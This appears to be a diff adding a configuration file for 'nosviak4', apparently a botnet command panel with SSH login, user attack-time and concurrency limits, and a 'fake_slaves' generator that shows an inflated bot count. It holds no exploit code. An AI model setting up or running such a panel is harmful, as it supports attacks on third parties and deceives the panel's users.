@@ -1,0 +1,42 @@
+
+[database]
+sqlite=true
+schemas="assets/schemas/"
+database="assets/nosviak4.sql"
+username=""
+password=""
+host=""
+
+[ssh]
+login_timeout=30
+
+# these options require a full restart for any modifications to take place.
+port=7070
+address=""
+server_key="assets/ssh.ppk"
+max_auth_attempts=4
+custom_auth=true
+
+[branding]
+live_reload=true
+
+[fake_slaves]
+enabled=true
+# configure this to change the slave count, minimum is the lowest and maximum is the highest
+maximum=100
+minimum=50
+# metaData for the slave gen
+sleep=1500
+max_change=5
+min_change=1
+
+# default_user is used for times of creation which can't have input fields
+[default_user]
+maxtime=200
+cooldown=30
+conns=2
+api=false
+expiry_days=30
+warns_before_kick=2
+max_sessions=1
+theme="default"
